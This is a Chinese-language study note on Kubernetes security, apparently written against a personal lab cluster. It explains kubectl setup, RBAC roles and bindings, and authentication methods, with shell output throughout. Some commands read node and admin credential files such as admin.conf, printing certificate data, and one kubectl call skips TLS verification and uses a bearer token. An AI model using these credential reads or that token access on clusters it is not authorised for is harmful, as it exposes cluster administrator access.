---
date: 2023/8/11 00:00:00
---

# kubernetes安全学习笔记

## 1. kubectl

通过kubectl我们可以与k8s apiserver进行交互，下载kubectl https://kubernetes.io/docs/tasks/tools/ 

```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

master节点配置kubectl

```
  mkdir -p $HOME/.kube
  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
  sudo chown $(id -u):$(id -g) $HOME/.kube/config
```

master节点

```
[root@master test]# kubectl --kubeconfig=/etc/kubernetes/admin.conf -s https://192.168.128.129:6443 get nodes
NAME           STATUS     ROLES                  AGE   VERSION
node           NotReady   control-plane,master   18h   v1.23.16
node01.local   NotReady   <none>                 26m   v1.23.16

```

普通node节点配置kubectl

```
    mkdir -p $HOME/.kube
  sudo cp -i /etc/kubernetes/kubelet.conf $HOME/.kube/config
  sudo chown $(id -u):$(id -g) $HOME/.kube/config
```

普通节点：

```
[root@node01 test]# kubectl --kubeconfig=/etc/kubernetes/kubelet.conf get nodes
NAME           STATUS     ROLES                  AGE   VERSION
node           NotReady   control-plane,master   18h   v1.23.16
node01.local   NotReady   <none>                 28m   v1.23.16
```

不验证服务器证书：

```
./kubectl -s https://192.168.128.129:6443 --insecure-skip-tls-verify=true --token eyJhbGc... get node
```

kubectl具体各参数选项的使用，在各节中可以看到，这里简单说一下：

```
有哪些权限
kubectl auth can-i --list
kubectl auth can-i get pods
...

角色以及绑定关系
kubectl get roles
kubectl get clusterroles
kubectl get rolebindings -A #-A表示所有命名空间
kubectl get clusterrolebindings

详情描述
kubectl describe [pod|node|role|xxxbindindg] ...

默认namespace为default，这里通过-n另外指定，并通过-o 输出详情，可以看到更多详细信息
kubectl get clusterroles -n kube-system -o yaml
kubectl get clusterroles -n kube-system -o wide
```

如果希望查看kubectl发出的具体请求，可以通过 -v 输出详情

```
[root@node01 test]# kubectl get pods -v 8
I0801 01:37:43.143978   65472 loader.go:374] Config loaded from file:  /root/.kube/config
I0801 01:37:43.145235   65472 cert_rotation.go:137] Starting client certificate rotation controller
I0801 01:37:43.148264   65472 round_trippers.go:463] GET https://192.168.128.129:6443/api/v1/namespaces/default/pods?limit=500
I0801 01:37:43.148273   65472 round_trippers.go:469] Request Headers:
I0801 01:37:43.148280   65472 round_trippers.go:473]     Accept: application/json;as=Table;v=v1;g=meta.k8s.io,application/json;as=Table;v=v1beta1;g=meta.k8s.io,application/json
I0801 01:37:43.148285   65472 round_trippers.go:473]     User-Agent: kubectl/v1.23.16 (linux/amd64) kubernetes/60e5135
I0801 01:37:43.164505   65472 round_trippers.go:574] Response Status: 200 OK in 16 milliseconds
I0801 01:37:43.164522   65472 round_trippers.go:577] Response Headers:
I0801 01:37:43.164528   65472 round_trippers.go:580]     X-Kubernetes-Pf-Prioritylevel-Uid: e4a262c0-3cdb-4d39-a9a4-87f58392b6a1
I0801 01:37:43.164532   65472 round_trippers.go:580]     Content-Length: 2935
I0801 01:37:43.164536   65472 round_trippers.go:580]     Date: Tue, 01 Aug 2023 08:37:43 GMT
I0801 01:37:43.164540   65472 round_trippers.go:580]     Audit-Id: 0a5e4a63-c21e-4e84-b9e9-c35e3922fe99
I0801 01:37:43.164544   65472 round_trippers.go:580]     Cache-Control: no-cache, private
I0801 01:37:43.164548   65472 round_trippers.go:580]     Content-Type: application/json
I0801 01:37:43.164568   65472 round_trippers.go:580]     X-Kubernetes-Pf-Flowschema-Uid: f5550bf1-1cbc-4865-92d2-272b83c12e18
I0801 01:37:43.164625   65472 request.go:1214] Response Body: {"kind":"Table","apiVersion":"meta.k8s.io/v1","metadata":{"resourceVersion":"462210"},"columnDefinitions":[{"name":"Name","type":"string","format":"name","description":"Name must be unique within a namespace. Is required when creating resources, although some resources may allow a client to request the generation of an appropriate name automatically. Name is primarily intended for creation idempotence and configuration definition. Cannot be updated. More info: http://kubernetes.io/docs/user-guide/identifiers#names","priority":0},{"name":"Ready","type":"string","format":"","description":"The aggregate readiness state of this pod for accepting traffic.","priority":0},{"name":"Status","type":"string","format":"","description":"The aggregate status of the containers in this pod.","priority":0},{"name":"Restarts","type":"string","format":"","description":"The number of times the containers in this pod have been restarted and when the last container in this pod has restarted.","priority":0},{"name":"Age","type":"st [truncated 1911 chars]

```



## 2. 权限机制

### 2.1. 概述RBAC

k8s的RBAC定义了[4种对象](https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/rbac/#api-overview) ："Role"、"ClusterRole"、"RoleBinding" 和 "ClusterRoleBinding"，基于角色的访问控制中，我们了解一下这里的 角色类型、账号类型、角色与账号的绑定。

- RBAC的R：k8s的角色定义了特定资源的访问权限，对于各节点来说，其是以API形式表现的，相关权限类型可参考[请求动词](https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/authorization/#determine-the-request-verb ) 。
- **Role**：这里指对namespaces类型的资源的访问控制，如 Pods、Services、ConfigMaps 
- **ClusterRole**：这里指非namespace类型资源的访问控制，即集群类型的，例如 Nodes、Namespaces、PersistentVolumes 等。
- **RoleBinding**：Role与 某绑定对象 的绑定关系
- **ClusterRoleBinding**：ClusterRole与  某绑定对象 的绑定关系
- 账户类型：账户类型有user account和service account，从笔者目前看到的内容来说，通过证书创建的方式为user account，其他情况下通常为 service account
- 绑定对象：角色可绑定到的对象类型有 user/group/service account   ，通过kubectl输出的绑定关系中的subjects.kind表示具体的绑定对象类型

按照官方的说法，user account的名称是跨namespace唯一的，其通过证书方式创建，我们在浏览角色绑定信息时，可以看到user有 kube-controller-manager 、kube-scheduler、kube-proxy等等，而这些组件服务都是客户端X509认证方式访问apiserver。

[**用户账号与服务账号**](https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/service-accounts-admin/#user-accounts-versus-service-accounts)：Kubernetes 区分 用户账号 和 服务账号 的概念（user / service account），主要基于以下原因：

- 用户账号是针对人而言的。而服务账号是针对运行在 Pod 中的应用进程而言的， 在 Kubernetes 中这些进程运行在容器中，而容器是 Pod 的一部分。
- 用户账号是全局性的。其名称在某集群中的所有名字空间中必须是唯一的。 无论你查看哪个名字空间，代表用户的特定用户名都代表着同一个用户。 在 Kubernetes 中，服务账号是名字空间作用域的。 两个不同的名字空间可以包含具有相同名称的 ServiceAccount。

- 通常情况下，集群的用户账号可能会从企业数据库进行同步， 创建新用户需要特殊权限，并且涉及到复杂的业务流程。 服务账号创建有意做得更轻量，允许集群用户为了具体的任务按需创建服务账号。 将 ServiceAccount 的创建与新用户注册的步骤分离开来， 使工作负载更易于遵从权限最小化原则。

- 对人员和服务账号审计所考虑的因素可能不同；这种分离更容易区分不同之处。
- 针对复杂系统的配置包可能包含系统组件相关的各种服务账号的定义。 因为服务账号的创建约束不多并且有名字空间域的名称，所以这种配置通常是轻量的。

身份认证策略 https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/authentication/#authentication-strategies



### 2.2. 资源

查询kubernates中被namespace约束的资源，与 RoleBinding 相关：

```
[root@master test]# kubectl api-resources --namespaced=true
NAME                        SHORTNAMES   APIVERSION                     NAMESPACED   KIND
bindings                                 v1                             true         Binding
configmaps                  cm           v1                             true         ConfigMap
endpoints                   ep           v1                             true         Endpoints
events                      ev           v1                             true         Event
limitranges                 limits       v1                             true         LimitRange
persistentvolumeclaims      pvc          v1                             true         PersistentVolumeClaim
pods                        po           v1                             true         Pod
podtemplates                             v1                             true         PodTemplate
replicationcontrollers      rc           v1                             true         ReplicationController
resourcequotas              quota        v1                             true         ResourceQuota
secrets                                  v1                             true         Secret
serviceaccounts             sa           v1                             true         ServiceAccount
services                    svc          v1                             true         Service
controllerrevisions                      apps/v1                        true         ControllerRevision
daemonsets                  ds           apps/v1                        true         DaemonSet
deployments                 deploy       apps/v1                        true         Deployment
replicasets                 rs           apps/v1                        true         ReplicaSet
statefulsets                sts          apps/v1                        true         StatefulSet
localsubjectaccessreviews                authorization.k8s.io/v1        true         LocalSubjectAccessReview
horizontalpodautoscalers    hpa          autoscaling/v2                 true         HorizontalPodAutoscaler
cronjobs                    cj           batch/v1                       true         CronJob
jobs                                     batch/v1                       true         Job
leases                                   coordination.k8s.io/v1         true         Lease
endpointslices                           discovery.k8s.io/v1            true         EndpointSlice
events                      ev           events.k8s.io/v1               true         Event
ingresses                   ing          networking.k8s.io/v1           true         Ingress
networkpolicies             netpol       networking.k8s.io/v1           true         NetworkPolicy
poddisruptionbudgets        pdb          policy/v1                      true         PodDisruptionBudget
rolebindings                             rbac.authorization.k8s.io/v1   true         RoleBinding
roles                                    rbac.authorization.k8s.io/v1   true         Role
csistoragecapacities                     storage.k8s.io/v1beta1         true         CSIStorageCapacity

```

查询kubernates跨namespace的资源,与 ClusterRoleBinding 相关：

```
[root@master test]# kubectl api-resources --namespaced=false
NAME                              SHORTNAMES   APIVERSION                             NAMESPACED   KIND
componentstatuses                 cs           v1                                     false        ComponentStatus
namespaces                        ns           v1                                     false        Namespace
nodes                             no           v1                                     false        Node
persistentvolumes                 pv           v1                                     false        PersistentVolume
mutatingwebhookconfigurations                  admissionregistration.k8s.io/v1        false        MutatingWebhookConfiguration
validatingwebhookconfigurations                admissionregistration.k8s.io/v1        false        ValidatingWebhookConfiguration
customresourcedefinitions         crd,crds     apiextensions.k8s.io/v1                false        CustomResourceDefinition
apiservices                                    apiregistration.k8s.io/v1              false        APIService
tokenreviews                                   authentication.k8s.io/v1               false        TokenReview
selfsubjectaccessreviews                       authorization.k8s.io/v1                false        SelfSubjectAccessReview
selfsubjectrulesreviews                        authorization.k8s.io/v1                false        SelfSubjectRulesReview
subjectaccessreviews                           authorization.k8s.io/v1                false        SubjectAccessReview
certificatesigningrequests        csr          certificates.k8s.io/v1                 false        CertificateSigningRequest
flowschemas                                    flowcontrol.apiserver.k8s.io/v1beta2   false        FlowSchema
prioritylevelconfigurations                    flowcontrol.apiserver.k8s.io/v1beta2   false        PriorityLevelConfiguration
ingressclasses                                 networking.k8s.io/v1                   false        IngressClass
runtimeclasses                                 node.k8s.io/v1                         false        RuntimeClass
podsecuritypolicies               psp          policy/v1beta1                         false        PodSecurityPolicy
clusterrolebindings                            rbac.authorization.k8s.io/v1           false        ClusterRoleBinding
clusterroles                                   rbac.authorization.k8s.io/v1           false        ClusterRole
priorityclasses                   pc           scheduling.k8s.io/v1                   false        PriorityClass
csidrivers                                     storage.k8s.io/v1                      false        CSIDriver
csinodes                                       storage.k8s.io/v1                      false        CSINode
storageclasses                    sc           storage.k8s.io/v1                      false        StorageClass
volumeattachments                              storage.k8s.io/v1                      false        VolumeAttachment

```

### 2.3. 身份认证策略

https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/authentication/#authentication-strategies

当集群中启用了多个身份认证模块时，只要有一个认证模块通过，身份认证就会通过。 API 服务器并不保证身份认证模块的运行顺序。

对于所有通过身份认证的用户，`system:authenticated` 组都会被添加到其组列表中。

k8s支持的身份认证策略包括  x509 cert、static token、bootstrap token、service account token、OpenID Connect（OIDC）令牌、webhook token认证、身份认证代理 ，其它身份认证协议（LDAP、SAML、Kerberos、X509 的替代模式等等） 可以通过使用一个[身份认证代理](https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/authentication/#authenticating-proxy)或[身份认证 Webhoook](https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/authentication/#webhook-token-authentication) 来实现。

#### 2.3.1. x509客户端证书认证

配置文件中设置相关选项即可启动客户端证书身份认证   https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/authentication/#x509-client-certs

如何生成证书参考 https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/certificates/

```
[root@master test]# cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep "client-ca-file"
    - --client-ca-file=/etc/kubernetes/pki/ca.crt

```

#### 2.3.2. 静态令牌

配置文件中通过以下选项生效，static token为长期有效，只能通过重启服务来重新配置

```
--token-auth-file=
```

```
Authorization: Bearer 31ada4fd-adec-460c-809a-9e56ceb75269
```

#### 2.3.3. bootstrap token

k8s自动动态管理的token，用于启动引导新的集群

这些令牌的格式为 `[a-z0-9]{6}.[a-z0-9]{16}`。第一个部分是令牌的 ID； 第二个部分是令牌的 Secret。你可以用如下所示的方式来在 HTTP 头部设置令牌：

```
Authorization: Bearer 781292.db7bc3a58fc5f07e
```

### 2.4. service account token

服务账号通常由 API 服务器自动创建并通过 `ServiceAccount` [准入控制器](https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/admission-controllers/)关联到集群中运行的 Pod 上。 持有者令牌会挂载到 Pod 中可预知的位置，允许集群内进程与 API 服务器通信。 服务账号也可以使用 Pod 规约的 `serviceAccountName` 字段显式地关联到 Pod 上

使用的是JWT的方式，所以这里通过公钥来验签

```
[root@master test]# cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep "service-account"
    - --service-account-issuer=https://kubernetes.default.svc.cluster.local
    - --service-account-key-file=/etc/kubernetes/pki/sa.pub
    - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key

```





### 2.5. 普通节点权限

普通节点如何查看当前用户信息？

查看配置文件：当前配置的用户为 ClusterRole 类型，证书路径为 /var/lib/kubelet/pki/kubelet-client-current.pem

```
[root@node01 test]#  cat /etc/kubernetes/kubelet.conf
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMvakNDQWVhZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJek1EY3hNVEEzTURFeE1sb1hEVE16TURjd09EQTNNREV4TWxvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTHhyCk5ERDJpNVArYXhYSmpTY2JLRk03M21mbFFhRE91RXA3cG5TQ3dMRTJmd29kUkZHK2VBU1Q3L1NjWlZTRVZ5N3cKK0cxTHovS0hyTmd4STIyd1hhTnV1SGRmNkNxMllmMnQwRVZOTUdKZU03bytTUUQ3Tmxxb0pWa1ZSSm9CdVVPbQpjdlBoN3V5YmZucjFkb29KNzdwQkhKNElOOTM0dDZPeHJ6T1ladUV3R2t1amJjcDV3OWV0NkdhUFgvUXRLdjk3Ci8vUExZYUdPMWRMSkFjbXU3RndjcTh4Mm5nc3dvcmE0Mi96bklMRW1xbTdwSGhNQURncVd0MHBnSWRDY1IweWMKUEN6cDV2ZWhLTzdHaWFXdFQvS0IxNEtsQjNOVnpmYlZmWXRMYStKVVNGbEhaTVIxMlBuYmtCY2l4V2VhbUNJNAovc0tsVDRBdlpkbWRFeHp0THhjQ0F3RUFBYU5aTUZjd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjBPQkJZRUZLK0d3SDFNMUhYODRRRGRWekJ3ekhpWTg5ekdNQlVHQTFVZEVRUU8KTUF5Q0NtdDFZbVZ5Ym1WMFpYTXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBR0xHSmRpa3pFeUhoM1dkNHBRTQp4L3ZOTzFBMmRnUkM0S0tPNk82VXo2d0s0b3p4RmZqMzFjV2dkanFzcmx2R2NiS0RVcWxwSE5aWnlJZ1NMVVVlCi9EdStuMDRWMkRBQzBlUFlQQXlQRWNUcXBIeFA4R0M0VWMwSWE0dURIUGtJdGlPT2pSMFUwRzlzMXlRaGNabzIKTzRKdTdoY1NvU05wVlpSQUdqK0RlMldNNmluSFVFMVlIQ05SNFgyei85VldCbGVGYjNUeVBGbmZqUjQyWU40OQp6TFZTMWhNSzVkQjJJWWNNNTBaMDN2MkJyQktsZ1pvcW9DOVhSdEw2NjBxYnFHc2R0K1hCOE1FOFZSOGNtMXRaCjU4NFJ0TmtZNkUrbGpXemZHZ04rWFFrNHk0YXdjTWgwNVJaYkhQNEJBckhQYWowaEVFTXE4a0taaitoMEozOTMKUk84PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
    server: https://192.168.128.129:6443
  name: default-cluster
contexts:
- context:
    cluster: default-cluster
    namespace: default
    user: default-auth
  name: default-context
current-context: default-context
kind: Config
preferences: {}
users:
- name: default-auth
  user:
    client-certificate: /var/lib/kubelet/pki/kubelet-client-current.pem
    client-key: /var/lib/kubelet/pki/kubelet-client-current.pem

```

具体用户名为 `system:node:node01.local` ，对应的组为 `system:nodes` 

```
[root@node01 test]# openssl x509 -in /var/lib/kubelet/pki/kubelet-client-current.pem -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            5f:1f:88:a4:93:f9:55:bc:31:7f:32:d5:aa:4f:04:de
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=kubernetes
        Validity
            Not Before: Jul 16 05:53:02 2023 GMT
            Not After : Jul 15 05:53:02 2024 GMT
        Subject: O=system:nodes, CN=system:node:node01.local
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (256 bit)
                pub:
                    04:e8:0a:99:77:e5:da:dd:a5:40:94:6b:34:84:94:
                    d0:f1:ba:79:27:bf:0a:83:bc:33:ad:db:3e:6d:f6:
                    72:03:13:f0:55:1b:c1:24:d7:e7:89:37:66:67:58:
                    aa:9d:81:f1:b2:e8:76:33:bb:e4:d1:be:45:4f:1a:
                    6d:95:ad:88:f4
                ASN1 OID: prime256v1
                NIST CURVE: P-256
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            X509v3 Extended Key Usage:
                TLS Web Client Authentication
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Authority Key Identifier:
                keyid:AF:86:C0:7D:4C:D4:75:FC:E1:00:DD:57:30:70:CC:78:98:F3:DC:C6

    Signature Algorithm: sha256WithRSAEncryption
         ab:b3:ac:ab:37:04:31:82:fe:0e:a0:a6:d6:47:af:d7:b2:94:
         ef:8c:85:b1:f7:ba:33:d9:a0:73:8d:af:e9:9e:8c:28:62:c3:
         e1:ed:c5:ba:90:24:0d:4d:96:13:e5:db:49:99:5f:c1:a1:05:
         d9:8f:19:a3:e2:dc:66:bf:67:ce:88:fa:96:9f:a0:a1:94:14:
         b8:b0:68:22:a4:3b:3f:15:07:c3:4c:ae:db:e9:00:5b:6f:56:
         d3:b1:8e:36:84:b3:59:1b:ee:04:05:db:d3:e8:89:f2:70:e6:
         28:cf:1a:90:dc:db:ff:d8:0d:b8:7c:fe:74:00:53:37:82:d2:
         3d:74:95:06:35:9c:18:48:a2:da:c3:b6:3a:2d:2b:bf:4e:e6:
         cb:2a:6e:8e:15:2b:be:7c:20:ba:7f:c4:5b:11:76:4d:39:a3:
         3f:52:d6:2e:d3:af:6b:dc:2f:cf:72:8d:ee:df:01:f2:0e:82:
         15:8c:c2:82:06:c2:ab:64:73:c7:4d:38:d9:c8:e6:90:44:b2:
         f5:ed:79:97:ba:d1:42:90:9c:2a:03:fb:54:df:69:4b:43:7d:
         17:16:8b:81:ad:0d:2b:4e:08:70:b6:44:0c:ee:4e:21:93:59:
         bf:73:94:eb:51:3d:f6:b7:7f:fa:f3:c7:aa:39:db:18:48:33:
         a9:56:db:32

```

在master节点上查询，需要通过输出yaml查看详细才能找到group的具体role/clusterrole

```
  mkdir -p $HOME/.kube
  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
  sudo chown $(id -u):$(id -g) $HOME/.kube/config
```



```
[root@master test]# kubectl get clusterrolebinding -o yaml -A | grep system:nodes
    name: system:nodes

ClusterRole相关：
- apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRoleBinding
  metadata:
    creationTimestamp: "2023-07-11T07:01:22Z"
    name: kubeadm:node-autoapprove-certificate-rotation
    resourceVersion: "226"
    uid: fd779762-1b2e-41cc-b9dc-507e14bc08ba
  roleRef:
    apiGroup: rbac.authorization.k8s.io
    kind: ClusterRole
    name: system:certificates.k8s.io:certificatesigningrequests:selfnodeclient
  subjects:
  - apiGroup: rbac.authorization.k8s.io
    kind: Group
    name: system:nodes


Role相关：
- apiVersion: rbac.authorization.k8s.io/v1
  kind: RoleBinding
  metadata:
    creationTimestamp: "2023-07-11T07:01:20Z"
    name: kubeadm:kubelet-config-1.23
    namespace: kube-system
    resourceVersion: "217"
    uid: 18f97f22-1509-44b8-a68b-30e92c9f9913
  roleRef:
    apiGroup: rbac.authorization.k8s.io
    kind: Role
    name: kubeadm:kubelet-config-1.23
  subjects:
  - apiGroup: rbac.authorization.k8s.io
    kind: Group
    name: system:nodes
  - apiGroup: rbac.authorization.k8s.io
    kind: Group
    name: system:bootstrappers:kubeadm:default-node-token
- apiVersion: rbac.authorization.k8s.io/v1
  kind: RoleBinding
  metadata:
    creationTimestamp: "2023-07-11T07:01:20Z"
    name: kubeadm:nodes-kubeadm-config
    namespace: kube-system
    resourceVersion: "214"
    uid: 127f5b26-7efc-409b-9a37-e6c8e530af47
  roleRef:
    apiGroup: rbac.authorization.k8s.io
    kind: Role
    name: kubeadm:nodes-kubeadm-config
  subjects:
  - apiGroup: rbac.authorization.k8s.io
    kind: Group
    name: system:bootstrappers:kubeadm:default-node-token
  - apiGroup: rbac.authorization.k8s.io
    kind: Group
    name: system:nodes


```

查询该角色的资源权限

```
[root@master test]# kubectl describe ClusterRole/system:certificates.k8s.io:certificatesigningrequests:selfnodeclient -n system:node
Name:         system:certificates.k8s.io:certificatesigningrequests:selfnodeclient
Labels:       kubernetes.io/bootstrapping=rbac-defaults
Annotations:  rbac.authorization.kubernetes.io/autoupdate: true
PolicyRule:
  Resources                                                      Non-Resource URLs  Resource Names  Verbs
  ---------                                                      -----------------  --------------  -----
  certificatesigningrequests.certificates.k8s.io/selfnodeclient  []                 []              [create]


[root@master test]# kubectl get clusterrole system:certificates.k8s.io:certificatesigningrequests:selfnodeclient -o yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  annotations:
    rbac.authorization.kubernetes.io/autoupdate: "true"
  creationTimestamp: "2023-07-11T07:01:20Z"
  labels:
    kubernetes.io/bootstrapping: rbac-defaults
  name: system:certificates.k8s.io:certificatesigningrequests:selfnodeclient
  resourceVersion: "109"
  uid: 575eafc4-d415-4e01-b4fd-3dd2d5412ccf
rules:
- apiGroups:
  - certificates.k8s.io
  resources:
  - certificatesigningrequests/selfnodeclient
  verbs:
  - create

[root@master test]# kubectl describe Role/kubeadm:nodes-kubeadm-config -n kube-system
Name:         kubeadm:nodes-kubeadm-config
Labels:       <none>
Annotations:  <none>
PolicyRule:
  Resources   Non-Resource URLs  Resource Names    Verbs
  ---------   -----------------  --------------    -----
  configmaps  []                 [kubeadm-config]  [get]

```

### 2.6. master节点

通过以下方式可以看到节点的用户组为 system:masters

certificate-authority-data用于对服务器TLS端口进行校验，集群名称为kubernetes； client-certificate-data client-key-data 用于客户端证书认证模式下的认证

```
[root@master test]# cat /etc/kubernetes/admin.conf
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMvakNDQWVhZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJek1EY3hNVEEzTURFeE1sb1hEVE16TURjd09EQTNNREV4TWxvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTHhyCk5ERDJpNVArYXhYSmpTY2JLRk03M21mbFFhRE91RXA3cG5TQ3dMRTJmd29kUkZHK2VBU1Q3L1NjWlZTRVZ5N3cKK0cxTHovS0hyTmd4STIyd1hhTnV1SGRmNkNxMllmMnQwRVZOTUdKZU03bytTUUQ3Tmxxb0pWa1ZSSm9CdVVPbQpjdlBoN3V5YmZucjFkb29KNzdwQkhKNElOOTM0dDZPeHJ6T1ladUV3R2t1amJjcDV3OWV0NkdhUFgvUXRLdjk3Ci8vUExZYUdPMWRMSkFjbXU3RndjcTh4Mm5nc3dvcmE0Mi96bklMRW1xbTdwSGhNQURncVd0MHBnSWRDY1IweWMKUEN6cDV2ZWhLTzdHaWFXdFQvS0IxNEtsQjNOVnpmYlZmWXRMYStKVVNGbEhaTVIxMlBuYmtCY2l4V2VhbUNJNAovc0tsVDRBdlpkbWRFeHp0THhjQ0F3RUFBYU5aTUZjd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjBPQkJZRUZLK0d3SDFNMUhYODRRRGRWekJ3ekhpWTg5ekdNQlVHQTFVZEVRUU8KTUF5Q0NtdDFZbVZ5Ym1WMFpYTXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBR0xHSmRpa3pFeUhoM1dkNHBRTQp4L3ZOTzFBMmRnUkM0S0tPNk82VXo2d0s0b3p4RmZqMzFjV2dkanFzcmx2R2NiS0RVcWxwSE5aWnlJZ1NMVVVlCi9EdStuMDRWMkRBQzBlUFlQQXlQRWNUcXBIeFA4R0M0VWMwSWE0dURIUGtJdGlPT2pSMFUwRzlzMXlRaGNabzIKTzRKdTdoY1NvU05wVlpSQUdqK0RlMldNNmluSFVFMVlIQ05SNFgyei85VldCbGVGYjNUeVBGbmZqUjQyWU40OQp6TFZTMWhNSzVkQjJJWWNNNTBaMDN2MkJyQktsZ1pvcW9DOVhSdEw2NjBxYnFHc2R0K1hCOE1FOFZSOGNtMXRaCjU4NFJ0TmtZNkUrbGpXemZHZ04rWFFrNHk0YXdjTWgwNVJaYkhQNEJBckhQYWowaEVFTXE4a0taaitoMEozOTMKUk84PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
    server: https://192.168.128.129:6443
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: kubernetes-admin
  name: kubernetes-admin@kubernetes
current-context: kubernetes-admin@kubernetes
kind: Config
preferences: {}
users:
- name: kubernetes-admin
  user:
    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURJVENDQWdtZ0F3SUJBZ0lJVVlWTUFtQW96dVV3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TXpBM01URXdOekF4TVRKYUZ3MHlOREEzTVRBd056QXhNVFJhTURReApGekFWQmdOVkJBb1REbk41YzNSbGJUcHRZWE4wWlhKek1Sa3dGd1lEVlFRREV4QnJkV0psY201bGRHVnpMV0ZrCmJXbHVNSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXhZeEUrSSt0SkUybkhlcWIKTXErNVFma2Z6UXVlUGw5RitBNHJuSlY1SGY1eUswVVN1dWNXTUdaUW5ITlRvMGtrU0JVS0QxRk4rc0g0eTlNMQo5cFI4K3N4cVhuYXVPUHpHcU1YOW9HVVJVWWt0VFBaWEZURW93b0JIdDBOSDBCeTVqRnVIYlFtRFE0bGR3S21VCjhjZkY4ZUpWU09hUzhqdmd6cnQyZ05CVng0ZTZFNU9ndUErYTJxcXNtejF2UW5uKzhoY2xOcmpidjJVemx3RHEKamVNNTlrSG1xTEEvUVRKUU1Rc1RjaGQ1ZWloZkVMTWdrOXhSNHg5VXE2bjhEUklNYW9uVnk3akNBZjU0THlnNwpxb1NRS2o4VzVxaG1XSU9UWW1EVDdmRWFxMWN2UFoxQThkMU1yT0lSVm9xVWtWK0VhUWdTMXJRS2FRWjdBVEloCjdwTUtEd0lEQVFBQm8xWXdWREFPQmdOVkhROEJBZjhFQkFNQ0JhQXdFd1lEVlIwbEJBd3dDZ1lJS3dZQkJRVUgKQXdJd0RBWURWUjBUQVFIL0JBSXdBREFmQmdOVkhTTUVHREFXZ0JTdmhzQjlUTlIxL09FQTNWY3djTXg0bVBQYwp4akFOQmdrcWhraUc5dzBCQVFzRkFBT0NBUUVBZUIwVzNoNXVyd0JUaDIvblQyTDhrNmxDQlRrbHFqN0RuUXNTCllXSm5rb3dFb0xBOWllSnM2azdPMllDTWRhTWdMZXVkQ3V0K2xaYVhJQ0Z0WUVmZTFnWkM4bzFCN2tacHBnamkKUU00SjRYeHZQZWltenpSZ1MwL3FBd1BHQ0NhMXd2K0x3dVJ6QVNLdkxQMXczNGlZWHJEYTZFRUJURkpNSmJDbwp1YWJUc2l5cmY4bWJDcEY0N2ZqQlZpRmhHTWlldzFJcXlOUEUvaEV2amVXYlNzUkhySjlZNDAraDlXWE5aTGp5CnVaK3FRby9YTGNCWFZmWTVZWmVmT0dsNXRMdGREWDd5ZWI0UGVlNjFvZnF4MkF3elZJeG8raEgxdm1WNkwzcFkKWFNtdElaMEFtdUNTNmY4RTQ5L3h3M2VKNTZHZnBFU0N5Q2Y0cW1aSGxza010aFNwUEE9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
